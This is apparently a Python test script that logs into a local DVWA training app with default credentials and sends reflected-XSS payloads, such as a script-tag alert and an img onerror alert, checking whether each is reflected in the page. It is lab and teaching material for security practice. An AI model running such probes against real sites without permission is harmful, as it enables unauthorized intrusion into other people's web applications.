import requests
from bs4 import BeautifulSoup

session = requests.Session()

# Login
resp = session.get('http://localhost/dvwa/login.php')
soup = BeautifulSoup(resp.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'user_token'}).get('value')

session.post('http://localhost/dvwa/login.php', data={
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
    'user_token': csrf_token
})

print('Authenticated, testing XSS with GET...\n')

payloads = [
    ('<marker>', '<marker>'),
    ('"><script>alert(1)</script>', '"><script'),
    ('<img src=x onerror="alert(1)">', '<img'),
    ('xsstest123', 'xsstest123'),
]

for payload, search_str in payloads:
    # Use GET query parameter
    url = f'http://localhost/dvwa/vulnerabilities/xss_r/?name={payload}'
    resp = session.get(url)
    
    found = search_str in resp.text
    print(f'Payload: {payload[:40]}')
    print(f'  URL: {url}')
    print(f'  Reflected: {found}')
    
    if found:
        idx = resp.text.find(search_str)
        start = max(0, idx - 100)
        end = min(len(resp.text), idx + 200)
        snippet = resp.text[start:end].replace('<', '[').replace('>', ']')
        print(f'  Context: ...{snippet}...')
    print()
